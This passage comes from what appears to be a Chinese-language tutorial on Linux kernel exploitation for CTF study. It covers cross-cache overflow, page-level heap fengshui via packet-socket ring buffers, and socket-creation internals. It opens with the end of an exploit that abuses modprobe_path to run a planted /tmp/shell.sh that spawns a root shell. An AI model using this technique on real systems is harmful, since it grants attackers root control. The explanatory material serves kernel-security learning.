  read_buf(bof_fd, &amp;p);</span><br><span class="line">    qword_dump(<span class="string">&quot;leak modprobe_path&quot;</span>, buf, <span class="number">0x30</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (open(<span class="string">&quot;/shell.sh&quot;</span>, O_RDWR) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        system(<span class="string">&quot;echo &#x27;#!/bin/sh&#x27; &gt;&gt; /tmp/shell.sh&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;echo &#x27;setsid /bin/cttyhack setuidgid 0 /bin/sh&#x27; &gt;&gt; /tmp/shell.sh&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;chmod +x /tmp/shell.sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/tmp/fake&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="Page-level-Fengshui"><a href="#Page-level-Fengshui" class="headerlink" title="Page-level Fengshui"></a>Page-level Fengshui</h2><h3 id="利用思路-14"><a href="#利用思路-14" class="headerlink" title="利用思路"></a>利用思路</h3><p><code>Cross-Cache-Overflow</code> 实际上是针对 <code>buddy system</code> 的利用手法。</p>
<ul>
<li><code>slub allocator</code> 底层逻辑是向 <code>buddy system</code> 请求页面后再划分成特定大小 <code>object</code> 返还给上层调用者<ul>
<li>→ 内存中用作不同 <code>kmem_cache</code> 的页面在内存上是有可能相邻的。</li>
</ul>
</li>
<li>若我们的漏洞对象存在于页面 A，溢出目标对象存在于页面 B，且 A、B两页面相邻，则我们便有可能实现跨越不同 <code>kmem_cache</code> 之间的堆溢出。</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/9238c63e2b3ebdb287ce19b0dd2c8d24.png"
                      alt="9238c63e2b3ebdb287ce19b0dd2c8d24"
                ></p>
<p>首先让我们重新审视 <code>slub allocator</code> 向 <code>buddy system</code> 请求页面的过程，当 <code>freelist page</code> 已经耗空且 <code>partial</code> 链表也为空时（或者 <code>kmem_cache</code> 刚刚创建后进行第一次分配时），其会向 <code>buddy system</code> 申请页面：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/yPtXiwzVfxWH7lE.png"
                      alt="yPtXiwzVfxWH7lE"
                ></p>
<p>接下来让我们重新审视 <code>buddy system</code> ，其基本原理就是以 <code>2</code> 的 <code>order</code> 次幂张内存页作为分配粒度，相同 <code>order</code>  间空闲页面构成双向链表，当低阶 <code>order</code> 的页面不够用时便会从高阶 <code>order</code> 取一份连续内存页拆成两半，其中一半挂回当前请求 <code>order</code>  链表，另一半返还给上层调用者；下图为以 <code>order 2</code> 为例的 <code>buddy system</code> 页面分配基本原理：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/5342f92979ae7f588c2058a4d2144d8b.gif"
                      alt="5342f92979ae7f588c2058a4d2144d8b"
                ></p>
<p>我们不难想到的是：从更高阶 order 拆分成的两份低阶 order 的连续内存页<strong>是物理连续的</strong>，由此我们可以：</p>
<ul>
<li>向 buddy system 请求两份连续的内存页。</li>
<li>释放其中一份内存页，在 <code>vulnerable kmem_cache</code> 上堆喷，让其取走这份内存页。</li>
<li>释放另一份内存页，在 <code>victim kmem_cache</code> 上堆喷，让其取走这份内存页。</li>
</ul>
<p><strong>此时我们便有可能溢出到其他的内核结构体上，从而完成 cross-cache overflow</strong>。</p>
<p><strong>注意 slub 申请的 object 位于线性映射区，因此溢出修改的是物理地址相邻的内存页。而 buddy system 的特性可以保证两个物理页物理地址相邻。</strong></p>
<p>在实际情况中我们无法准确控制 buddy system ，因此这一步骤改为：</p>
<ul>
<li>向 buddy system 请求大量的内存页</li>
<li>释放其中一半内存页，在 <code>vulnerable kmem_cache</code> 上堆喷，让其取走这些内存页</li>
<li>释放另一半内存页，在 <code>victim kmem_cache</code> 上堆喷，让其取走这些内存页</li>
</ul>
<p>这样我们有很大概率构造出上面那种情况，从而可以溢出到其他的内核结构体上完成 cross-cache overflow 。</p>
<p><strong>使用 setsockopt 与 pgv 完成页级内存占位与堆风水</strong></p>
<p>当我们创建一个 protocol 为 <code>PF_PACKET</code> 的 socket 之后，先调用 <code>setsockopt()</code> 将 <code>PACKET_VERSION</code> 设为  <code>TPACKET_V1 </code>&#x2F; <code>TPACKET_V2</code>，再调用 <code>setsockopt()</code> 提交一个 <code>PACKET_TX_RING</code> ，此时便存在如下调用链：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__sys_setsockopt()</span><br><span class="line">    sock-&gt;ops-&gt;setsockopt()</span><br><span class="line">    	packet_setsockopt() <span class="comment">// case PACKET_TX_RING ↓</span></span><br><span class="line">    		packet_set_ring()</span><br><span class="line">    			alloc_pg_vec()</span><br></pre></td></tr></table></figure></div>

<p>在 <code>alloc_pg_vec()</code> 中会创建一个 <code>pgv</code> 结构体，用以分配 <code>tp_block_nr</code> 份 <code>2 order</code> 张内存页，其中 <code>order</code> 由 <code>tp_block_size</code> 决定：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> pgv *<span class="title function_">alloc_pg_vec</span><span class="params">(<span class="keyword">struct</span> tpacket_req *req, <span class="type">int</span> order)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> block_nr = req-&gt;tp_block_nr;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pgv</span> *<span class="title">pg_vec</span>;</span></span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">	pg_vec = kcalloc(block_nr, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pgv), GFP_KERNEL | __GFP_NOWARN);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!pg_vec))</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; block_nr; i++) &#123;</span><br><span class="line">		pg_vec[i].buffer = alloc_one_pg_vec_page(order);</span><br><span class="line">		<span class="keyword">if</span> (unlikely(!pg_vec[i].buffer))</span><br><span class="line">			<span class="keyword">goto</span> out_free_pgvec;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> pg_vec;</span><br><span class="line"></span><br><span class="line">out_free_pgvec:</span><br><span class="line">	free_pg_vec(pg_vec, order, block_nr);</span><br><span class="line">	pg_vec = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>alloc_one_pg_vec_page()</code> 中会直接调用 <code>__get_free_pages()</code> 向 <code>buddy system</code> 请求内存页，因此我们可以利用该函数进行大量的页面请求：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">char</span> *<span class="title function_">alloc_one_pg_vec_page</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> order)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> *buffer;</span><br><span class="line">	<span class="type">gfp_t</span> gfp_flags = GFP_KERNEL | __GFP_COMP |</span><br><span class="line">			  __GFP_ZERO | __GFP_NOWARN | __GFP_NORETRY;</span><br><span class="line"></span><br><span class="line">	buffer = (<span class="type">char</span> *) __get_free_pages(gfp_flags, order);</span><br><span class="line">	<span class="keyword">if</span> (buffer)</span><br><span class="line">		<span class="keyword">return</span> buffer;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>相应地， <code>pgv</code> 中的页面也会在 <code>socket</code> 被关闭后释放：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">packet_release()</span><br><span class="line">    packet_set_ring()</span><br><span class="line">    	free_pg_vec()</span><br></pre></td></tr></table></figure></div>

<p><code>setsockopt()</code>  也可以帮助我们完成<strong>页级堆风水</strong>，当我们耗尽 <code>buddy system</code> 中的 <code>low order pages</code> 后，我们再请求的页面便都是物理连续的，因此此时我们再进行  <code>setsockopt()</code>  便<strong>相当于获取到了一块近乎物理连续的内存</strong>（为什么是”近乎连续“是因为大量的 <code>setsockopt()</code> 流程中同样会分配大量我们不需要的结构体，从而消耗 <code>buddy system</code> 的部分页面）。</p>
<h3 id="exp-14"><a href="#exp-14" class="headerlink" title="exp"></a>exp</h3><h2 id="Page-level-UAF"><a href="#Page-level-UAF" class="headerlink" title="Page-level UAF"></a>Page-level UAF</h2><h3 id="利用思路-15"><a href="#利用思路-15" class="headerlink" title="利用思路"></a>利用思路</h3><h3 id="exp-15"><a href="#exp-15" class="headerlink" title="exp"></a>exp</h3><h2 id="Dirty-Pagetable"><a href="#Dirty-Pagetable" class="headerlink" title="Dirty Pagetable"></a>Dirty Pagetable</h2><h3 id="利用思路-16"><a href="#利用思路-16" class="headerlink" title="利用思路"></a>利用思路</h3><h3 id="exp-16"><a href="#exp-16" class="headerlink" title="exp"></a>exp</h3><h2 id="USMA"><a href="#USMA" class="headerlink" title="USMA"></a>USMA</h2><p>这题我们以<code>ARM64</code>的内核为例。</p>
<p><strong>socket系统调用</strong></p>
<p>先了解一下<code>socket</code>系统调用的创建的一个过程。<code>socket</code>用于创建网络套接字，这个套接字可以发送和接收数据。具体使用如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">socket</span><span class="params">(<span class="type">int</span> family, <span class="type">int</span> type, <span class="type">int</span> protocol)</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">family: 协议族。</span></span><br><span class="line"><span class="comment">AF_INET：IPv4地址族。AF_INET6：IPv6地址族，AF_UNIX：用于本地通信的Unix域套接字（IPC），AF_PACKET：用于直接访问链路层的原始数据包。</span></span><br><span class="line"><span class="comment">type ：套接字类型</span></span><br><span class="line"><span class="comment">SOCK_STREAM：字节流(TCP)</span></span><br><span class="line"><span class="comment">SOCK_DGRAM：无连接的数据报(UDP)</span></span><br><span class="line"><span class="comment">SOCK_RAW：原始套接字，可以直接访问底层协议(ip)</span></span><br><span class="line"><span class="comment">protocol：协议</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);<span class="comment">//创建一个TCP套接字</span></span><br></pre></td></tr></table></figure></div>

<p><code>socket()</code>调用使用<code>sock_create()</code>创建套接字，并使用<code>sock_map_fd()</code>返回相应的文件描述符。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __sys_socket(<span class="type">int</span> family, <span class="type">int</span> type, <span class="type">int</span> protocol)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> retval;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">sock</span>;</span></span><br><span class="line">    <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//调用sock_create创建套接字，多传入一个socket结构体</span></span><br><span class="line">    retval = sock_create(family, type, protocol, &amp;sock);</span><br><span class="line">    <span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> retval;</span><br><span class="line">    <span class="comment">//将创建的套接字映射到一个文件描述符上</span></span><br><span class="line">    <span class="keyword">return</span> sock_map_fd(sock, flags &amp; (O_CLOEXEC | O_NONBLOCK));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>sock_create()</code>创建套接字,会调用<code>sock_create()-&gt;__sock_create()</code>，首先通过<code>sock_alloc()</code>分配socket结构体，然后通过传入的<code>family</code>获取协议模块，在通过协议模块的<code>ops(pf-&gt;create)</code>，来初始化<code>socket</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sock_create</span><span class="params">(<span class="type">int</span> family, <span class="type">int</span> type, <span class="type">int</span> protocol, <span class="keyword">struct</span> socket **res)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> __sock_create(current-&gt;nsproxy-&gt;net_ns, family, type, protocol, res, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __sock_create(<span class="keyword">struct</span> net *net, <span class="type">int</span> family, <span class="type">int</span> type, <span class="type">int</span> protocol,</span><br><span class="line">             <span class="keyword">struct</span> socket **res, <span class="type">int</span> kern)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> err;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">sock</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">net_proto_family</span> *<span class="title">pf</span>;</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     *  Allocate the socket and allow the family to set things up. if</span></span><br><span class="line"><span class="comment">     *  the protocol is 0, the family is instructed to select an appropriate</span></span><br><span class="line"><span class="comment">     *  default.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    sock = sock_alloc();<span class="comment">//分配socket结构体</span></span><br><span class="line">    <span class="keyword">if</span> (!sock) &#123;</span><br><span class="line">        net_warn_ratelimited(<span class="string">&quot;socket: no more sockets\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> -ENFILE; <span class="comment">/* Not exactly a match, but its the</span></span><br><span class="line"><span class="comment">                   closest posix thing */</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sock-&gt;type = type;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    rcu_read_lock();</span><br><span class="line">    pf = rcu_dereference(net_families[family]);<span class="comment">//根据传入的family获取协议模块</span></span><br><span class="line">    err = -EAFNOSUPPORT;</span><br><span class="line">    <span class="keyword">if</span> (!pf)</span><br><span class="line">        <span class="keyword">goto</span> out_release;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * We will call the -&gt;create function, that possibly is in a loadable</span></span><br><span class="line"><span class="comment">     * module, so we have to bump that loadable module refcnt first.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (!try_module_get(pf-&gt;owner))<span class="comment">//增加协议模块的引用计数，防止被卸载</span></span><br><span class="line">        <span class="keyword">goto</span> out_release;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Now protected by module ref count */</span></span><br><span class="line">    rcu_read_unlock();</span><br><span class="line">    <span class="comment">//初始化套接字</span></span><br><span class="line">    err = pf-&gt;create(net, sock, protocol, kern);</span><br><span class="line">    <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> out_module_put;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    *res = sock;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在根据传入的<code>family</code>获取协议模块的时候，通过交叉索引找到<code>sock_register()</code>为相应<code>net_families[]</code>的注册函数</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注册新的网络协议族</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sock_register</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> net_proto_family *ops)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ops-&gt;family &gt;= NPROTO) &#123;</span><br><span class="line">        pr_crit(<span class="string">&quot;protocol %d &gt;= NPROTO(%d)\n&quot;</span>, ops-&gt;family, NPROTO);</span><br><span class="line">        <span class="keyword">return</span> -ENOBUFS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    spin_lock(&amp;net_family_lock);</span><br><span class="line">    <span class="comment">//检查是否已经注册</span></span><br><span class="line">    <span class="keyword">if</span> (rcu_dereference_protected(net_families[ops-&gt;family],</span><br><span class="line">                      lockdep_is_held(&amp;net_family_lock)))</span><br><span class="line">        err = -EEXIST;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//如果未注册，则将新的协议操作ops，赋值给net_families对应family位置</span></span><br><span class="line">        rcu_assign_pointer(net_families[ops-&gt;family], ops);</span><br><span class="line">        err = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    spin_unlock(&amp;net_family_lock);</span><br><span class="line"></span><br><span class="line">    pr_info(<span class="string">&quot;NET: Registered protocol family %d\n&quot;</span>, ops-&gt;family);</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在<code>net/packet/af_packet.c</code>中找到注册函数的调用，这里<code>family</code>为<code>PF_PACKET</code>，同时<code>create</code>为<code>packet_create()</code>，继续分析<code>create</code>函数</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">net_proto_family</span> <span class="title">packet_family_ops</span> =</span> &#123;</span><br><span class="line">    .family =   PF_PACKET,</span><br><span class="line">    .create =   packet_create,</span><br><span class="line">    .owner  =   THIS_MODULE,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">packet_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> rc;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    rc = sock_register(&amp;packet_family_ops);<span class="comment">//注册网络协议族</span></span><br><span class="line">    <span class="keyword">if</span> (rc)</span><br><span class="line">        <span class="keyword">goto</span> out_proto;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>packet_create()</code>会先对套接字的<code>type</code>做检查，然后使用<code>sk_alloc</code>分配独立的<code>object</code>，函数指针(<code>ops</code>)的赋值需要注意，之后就是数据包和一些锁、钩子等操作。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">packet_create</span><span class="params">(<span class="keyword">struct</span> net *net, <span class="keyword">struct</span> socket *sock, <span class="type">int</span> protocol,</span></span><br><span class="line"><span class="params">             <span class="type">int</span> kern)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">packet_sock</span> *<span class="title">po</span>;</span></span><br><span class="line">    __be16 proto = (__force __be16)protocol; <span class="comment">/* weird, but documented */</span></span><br><span class="line">    <span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ns_capable(net-&gt;user_ns, CAP_NET_RAW))</span><br><span class="line">        <span class="keyword">return</span> -EPERM;</span><br><span class="line">    <span class="keyword">if</span> (sock-&gt;type != SOCK_DGRAM &amp;&amp; sock-&gt;type != SOCK_RAW &amp;&amp;</span><br><span class="line">        sock-&gt;type != SOCK_PACKET)</span><br><span class="line">        <span class="keyword">return</span> -ESOCKTNOSUPPORT;</span><br><span class="line"></span><br><span class="line">    sock-&gt;state = SS_UNCONNECTED;<span class="comment">//套接字初始为未连接状态SS_UNCONNECTED</span></span><br><span class="line"></span><br><span class="line">    err = -ENOBUFS;</span><br><span class="line">    <span class="comment">//sk分配为独立kmem_cache</span></span><br><span class="line">    sk = sk_alloc(net, PF_PACKET, GFP_KERNEL, &amp;packet_proto, kern);</span><br><span class="line">    <span class="keyword">if</span> (sk == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    <span class="comment">//套接字ops赋值,函数调用的关键点</span></span><br><span class="line">    sock-&gt;ops = &amp;packet_ops;</span><br><span class="line">    <span class="keyword">if</span> (sock-&gt;type == SOCK_PACKET)<span class="comment">//数据套接字包使用特定的包ops</span></span><br><span class="line">        sock-&gt;ops = &amp;packet_ops_spkt;</span><br><span class="line"></span><br><span class="line">    sock_init_data(sock, sk);<span class="comment">//sk赋值给socket</span></span><br><span class="line"></span><br><span class="line">    po = pkt_sk(sk);<span class="comment">//获取packet_sock</span></span><br><span class="line">    init_completion(&amp;po-&gt;skb_completion);<span class="comment">//初始化skb_completion，用于数据包接收的同步</span></span><br><span class="line">    sk-&gt;sk_family = PF_PACKET;</span><br><span class="line">    po-&gt;num = proto;</span><br><span class="line">    po-&gt;xmit = dev_queue_xmit;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">proto_ops</span> <span class="title">packet_ops</span> =</span> &#123;</span><br><span class="line">    .family =   PF_PACKET,</span><br><span class="line">    .owner =    THIS_MODULE,</span><br><span class="line">    .release =  packet_release,</span><br><span class="line">    .bind =     packet_bind,</span><br><span class="line">    .connect =  sock_no_connect,</span><br><span class="line">    .socketpair =   sock_no_socketpair,</span><br><span class="line">    .accept =   sock_no_accept,</span><br><span class="line">    .getname =  packet_getname,</span><br><span class="line">    .poll =     packet_poll,</span><br><span class="line">    .ioctl =    packet_ioctl,</span><br><span class="line">    .gettstamp =    sock_gettstamp,</span><br><span class="line">    .listen =   sock_no_listen,</span><br><span class="line">    .shutdown = sock_no_shutdown,</span><br><span class="line">    .setsockopt =   packet_setsockopt,</span><br><span class="line">    .getsockopt =   packet_getsockopt,</span><br><span class="line">    .sendmsg =  packet_sendmsg,</span><br><span class="line">    .recvmsg =  packet_recvmsg,</span><br><span class="line">    .mmap =     packet_mmap,</span><br><span class="line">    .sendpage = sock_no_sendpage,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>基本了解了socket创建和初始化的过程之后，我们进一步了解漏洞的产生原因。</p>
<p><strong>setsockopt</strong></p>
<p>允许开发者灵活配置套接字的行为,以满足应用程序的更多特定需求。具体调用参数如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">setsockopt</span><span class="params">(<span class="type">int</span> sockfd, <span class="type">int</span> level, <span class="type">int</span> optname, <span class="type">const</span> <span class="type">void</span> *optval, <span class="type">socklen_t</span> optlen)</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">sockfd:套接字描述符</span></span><br><span class="line"><span class="comment">level：指定选项所在的协议层</span></span><br><span class="line"><span class="comment">optname：要设置的选项名称，不同层次有不同的选项</span></span><br><span class="line"><span 